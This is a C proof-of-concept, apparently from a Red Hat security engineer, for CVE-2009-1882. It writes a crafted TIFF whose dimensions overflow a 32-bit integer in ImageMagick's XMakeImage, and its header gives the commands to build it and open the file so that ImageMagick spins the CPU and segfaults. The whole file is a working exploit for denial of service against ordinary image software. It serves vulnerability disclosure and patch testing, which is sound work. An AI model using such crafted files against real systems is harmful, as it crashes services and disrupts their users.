/* CVE-2009-1882 ImageMagick XMakeImage int overflow PoC
 * Thu Jun 04 2009 Jan iankko Lieskovsky <jlieskov@redhat.com> 
 * Based on TIFF sample code from:
 * http://www.ibm.com/developerworks/linux/library/l-libtiff/write.c
 *
 * cc create_tif.c -o create_tif -lm -ltiff
 * ./create_tif /tmp/sample.tif
 * display /tmp/sample.tif 
 * (watch ImageMagick eating CPU && wait ~3mins for the seg fault)
 */

#include <stdio.h>
#include <tiffio.h>
#include <stdlib.h>

int main (int argc, char** argv) {

  TIFF *image;

  // Check for proper input
  if (argc < 2) {
    fprintf(stderr, "Usage: %s output_file \n", argv[0]);
    exit(EXIT_FAILURE);
  }

  // Open the TIFF file
  if((image = TIFFOpen(argv[1], "w")) == NULL){
    printf("Could not open %s for writing.\n", argv[1]);
    exit(EXIT_FAILURE);
  }
  
  // Specify TIFF image with width * height * bitspersample > 2^32-1
  int width = 8193, height = 65536;

  // Create the image content and store it to buffer
  char* buffer = calloc(width * height, sizeof(char));
  int i = 0, j = 0;
  int black = 0xF8, white = 0x00;

  for (i = 0; i < width; i++) {
    for (j = 0; j < height; j++) {
      if (i % 2 == 0) { buffer[i * j] = (char) black; }
      else { buffer[i * j] = (char) white; }
    }
  }

  // Set up TIFF tags
  TIFFSetField(image, TIFFTAG_IMAGEWIDTH, width * 8);
  TIFFSetField(image, TIFFTAG_IMAGELENGTH, height);
  TIFFSetField(image, TIFFTAG_BITSPERSAMPLE, 1);
  TIFFSetField(image, TIFFTAG_SAMPLESPERPIXEL, 1);
  TIFFSetField(image, TIFFTAG_ROWSPERSTRIP, height);
  TIFFSetField(image, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);
  TIFFSetField(image, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_MINISWHITE);
  TIFFSetField(image, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);
  TIFFSetField(image, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);
  TIFFSetField(image, TIFFTAG_XRESOLUTION, 300.0);
  TIFFSetField(image, TIFFTAG_YRESOLUTION, 300.0);
  TIFFSetField(image, TIFFTAG_RESOLUTIONUNIT, RESUNIT_INCH);

  // Write the information to the file
  TIFFWriteEncodedStrip(image, 0, buffer, width * height);

  // Free the allocated memory
  free(buffer);

  // Close the file
  TIFFClose(image);

return 0;
}
